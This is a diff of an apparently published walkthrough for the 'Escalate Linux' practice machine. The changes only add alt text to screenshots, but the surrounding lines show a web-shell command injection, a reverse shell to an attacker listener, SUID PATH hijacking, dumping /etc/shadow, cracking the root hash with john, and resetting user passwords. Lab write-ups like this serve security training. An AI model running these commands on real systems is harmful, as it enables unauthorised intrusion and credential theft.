@@ -44,8 +44,8 @@ nmap -A -p- 192.168.1.18 --min-rate 10000 -oN nmap.out
 | 445      | smb         |
 | 2049     | nfs         |
 
-![](https://cdn.ziomsec.com/escalate_linux/1.webp)
-![](https://cdn.ziomsec.com/escalate_linux/2.webp)
+![nmap scan on escalate linux machine](https://cdn.ziomsec.com/escalate_linux/1.webp)
+![nmap scan on escalate linux machine](https://cdn.ziomsec.com/escalate_linux/2.webp)
 
 ## Initial Foothold
 
@@ -53,7 +53,7 @@ nmap -A -p- 192.168.1.18 --min-rate 10000 -oN nmap.out
 
 I accessed the HTTP server running on the target and landed on *Apache*'s default landing page.
 
-![](https://cdn.ziomsec.com/escalate_linux/3.webp)
+![accessing the web application](https://cdn.ziomsec.com/escalate_linux/3.webp)
 
 Since there was nothing of interest on the landing page, I looked for hidden files using **ffuf** and found a **php** file.
 
@@ -61,7 +61,7 @@ Since there was nothing of interest on the landing page, I looked for hidden fil
 ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -mc 200,302
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/4.webp)
+![fuzzing hidden files in web application](https://cdn.ziomsec.com/escalate_linux/4.webp)
 
 Accessing the file revealed that it required a parameter called *cmd*.
 
@@ -69,7 +69,7 @@ Accessing the file revealed that it required a parameter called *cmd*.
 curl http://target/shell.php
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/5.webp)
+![accessing shell.php](https://cdn.ziomsec.com/escalate_linux/5.webp)
 
 To test out the *cmd* parameter, I sent another request by appending a shell command and got an interesting response from the target.
 
@@ -77,7 +77,7 @@ To test out the *cmd* parameter, I sent another request by appending a shell com
 curl -X GET http://target/shell.php?cmd=whoami
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/6.webp)
+![executing arbitrary commands](https://cdn.ziomsec.com/escalate_linux/6.webp)
 
 The value being passed in the *cmd* parameter was being executed by the server and its result was being returned in the response. I leveraged this to first verify if the target had **netcat** and **bash** shell and then got a reverse shell.
 
@@ -86,7 +86,7 @@ curl -X GET http://attacker/shell.php?cmd=which+nc
 curl -X GET http://attacker/shell.php?cmd=which+bash
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/7.webp)
+![validating netcat and bash presence](https://cdn.ziomsec.com/escalate_linux/7.webp)
 
 > You can get the reverse shell payload from **[revshells](https://www.revshells.com/)**. 
 
@@ -98,11 +98,11 @@ rlwrap nc -lnvp 4444
 curl -x GET http://attacker/shell.php?cmd={REVSHELL_NC-MKFIFO_PAYLOAD} # URL encode the payload
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/8.webp)
+![executing reverse shell payload](https://cdn.ziomsec.com/escalate_linux/8.webp)
 
 After the payload was executed on the target, I got a reverse shell on my **netcat** listener.
 
-![](https://cdn.ziomsec.com/escalate_linux/9.webp)
+![reverse shell on netcat listener](https://cdn.ziomsec.com/escalate_linux/9.webp)
 
 ### Spawning TTY
 
@@ -117,7 +117,7 @@ which python
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/10.webp)
+![spawning a tty shell](https://cdn.ziomsec.com/escalate_linux/10.webp)
 
 ## Privilege Escalation
 
@@ -131,7 +131,7 @@ find / -user root -perm -u=s -ls 2>/dev/null
 
 I found 2 interesting files: *script* and *shell*.
 
-![](https://cdn.ziomsec.com/escalate_linux/11.webp)
+![searching for suid bits](https://cdn.ziomsec.com/escalate_linux/11.webp)
 
 **USING `/USER3/SHELL`**
 I executed the **shell** program in the */home/user3/* directory and gained root access.
@@ -141,7 +141,7 @@ cd /home/user3/
 ./shell
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/12.webp)
+![gaining root access with shell command](https://cdn.ziomsec.com/escalate_linux/12.webp)
 
 **MODIFYING THE `/USER5/SCRIPT` FILE**
 I executed the **script** program present in the *user5* directory and obtained results similar to the `ls` command.
@@ -151,7 +151,7 @@ cd /home/user5/
 ./script
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/13.webp)
+![running script program](https://cdn.ziomsec.com/escalate_linux/13.webp)
 
 > You can also use **[pspy](https://github.com/DominicBreuker/pspy)** to monitor the processes.
 
@@ -162,7 +162,7 @@ I created a script that ran **bash** in privileged mode and named it `ls`.
 /bin/bash -p
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/14.webp)
+![creating payload](https://cdn.ziomsec.com/escalate_linux/14.webp)
 
 I then added the directory where I stored this in the `PATH` variable. Since this path was appended at the start, anytime the system looked for `ls` without it's complete path, it would find it here itself and would hence execute **bash** in privileged mode.
 
@@ -170,13 +170,13 @@ I then added the directory where I stored this in the `PATH` variable. Since thi
 export PATH=tmp:$PATH
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/15.webp)
+![adding path](https://cdn.ziomsec.com/escalate_linux/15.webp)
 
-![](https://cdn.ziomsec.com/escalate_linux/16.webp)
+![viewing path](https://cdn.ziomsec.com/escalate_linux/16.webp)
 
 Finally, I executed the script.
 
-![](https://cdn.ziomsec.com/escalate_linux/17.webp)
+![getting root shell using script program](https://cdn.ziomsec.com/escalate_linux/17.webp)
 
 ### Cracking Root Password
 
@@ -189,7 +189,7 @@ echo 'cat /etc/shadow' >> ls
 export PATH=/tmp:$PATH
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/18.webp)
+![creating a payload to get the shadow file](https://cdn.ziomsec.com/escalate_linux/18.webp)
 
 Finally, I gave this file execution permission, ran **/home/user5/script** and got a root password.
 
@@ -198,7 +198,7 @@ chmod +x ls
 /home/user5/script
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/19.webp)
+![getting the shadow file](https://cdn.ziomsec.com/escalate_linux/19.webp)
 
 **`$6$`** indicates the usage of **SHA-512** hash. I copied the password field on my system and used **john** to crack it.
 
@@ -207,7 +207,7 @@ echo 'HASH' > linpass
 john linpass
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/20.webp)
+![cracking root hash with john](https://cdn.ziomsec.com/escalate_linux/20.webp)
 
 I then switched to *root* using **su**
 
@@ -216,7 +216,7 @@ su root
 # enter password
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/21.webp)
+![switching to root](https://cdn.ziomsec.com/escalate_linux/21.webp)
 
 ### Using `user1` Privs
 
@@ -228,7 +228,7 @@ echo 'echo "user1:PASSWORD" | chpasswd' >> ls
 export PATH=/tmp:$PATH
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/22.webp)
+![exporting path](https://cdn.ziomsec.com/escalate_linux/22.webp)
 
 Executing the script allowed me to switch to *user1*.
 
@@ -239,7 +239,7 @@ su user1
 # enter new PASSWORD
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/23.webp)
+![switching to user 1](https://cdn.ziomsec.com/escalate_linux/23.webp)
 
 I then viewed *user1*'s **sudo** privileges and found that I could run any command as root.
 
@@ -247,7 +247,7 @@ I then viewed *user1*'s **sudo** privileges and found that I could run any comma
 sudo -l
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/24.webp)
+![viewing sudo privileges](https://cdn.ziomsec.com/escalate_linux/24.webp)
 
 Hence, I switched to *root*.
 
@@ -255,7 +255,7 @@ Hence, I switched to *root*.
 sudo su
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/25.webp)
+![switching to root](https://cdn.ziomsec.com/escalate_linux/25.webp)
 
 ### Using `/etc/passwd` Read Perm
 
@@ -265,7 +265,7 @@ I read the `/etc/passwd` file and found that *user7* was part of the root group.
 tail /etc/passwd
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/26.webp)
+![reading /etc/passwd](https://cdn.ziomsec.com/escalate_linux/26.webp)
 
 ```shell
 echo '#!/bin/bash' > ls
@@ -275,7 +275,7 @@ export PATH=/tmp:$PATH
 /user/user5/script
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/27.webp)
+![changing password for all users](https://cdn.ziomsec.com/escalate_linux/27.webp)
 
 Finally, I switched user and got privileged access.
 
@@ -284,7 +284,7 @@ su user7
 # enter new PASSWORD
 ```
 
-![](https://cdn.ziomsec.com/escalate_linux/28.webp)
+![switching to user7 for root access](https://cdn.ziomsec.com/escalate_linux/28.webp)
 
 # Closure
 
